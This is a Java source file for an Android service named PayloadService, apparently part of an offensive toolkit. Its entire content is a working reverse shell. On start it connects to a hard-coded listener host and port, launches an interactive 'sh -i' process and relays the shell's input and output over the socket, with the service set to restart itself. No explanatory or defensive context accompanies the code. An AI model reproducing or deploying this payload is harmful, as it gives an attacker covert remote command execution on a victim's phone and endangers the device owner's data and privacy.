package com.cybergforce.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PayloadService extends Service {
    private static final String LHOST = "192.168.1.1";
    private static final int LPORT = 8888;
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("CF-VOID", "Payload service starting...");

        executor.execute(new Runnable() {
            @Override
            public void run() {
                startReverseShell();
            }
        });

        return START_STICKY;
    }

    private void startReverseShell() {
        try {
            Socket socket = new Socket(LHOST, LPORT);
            InputStream in = socket.getInputStream();
            OutputStream out = socket.getOutputStream();

            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-i"});

            // Thread: socket -> process stdin
            Thread socketToProcess = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        byte[] buffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = in.read(buffer)) != -1) {
                            process.getOutputStream().write(buffer, 0, bytesRead);
                            process.getOutputStream().flush();
                        }
                    } catch (IOException e) {}
                }
            });

            // Thread: process stdout -> socket
            Thread processToSocket = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        byte[] buffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = process.getInputStream().read(buffer)) != -1) {
                            out.write(buffer, 0, bytesRead);
                            out.flush();
                        }
                    } catch (IOException e) {}
                }
            });

            socketToProcess.start();
            processToSocket.start();

        } catch (Exception e) {
            Log.e("CF-VOID", "Reverse shell failed: " + e.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        executor.shutdownNow();
    }
}
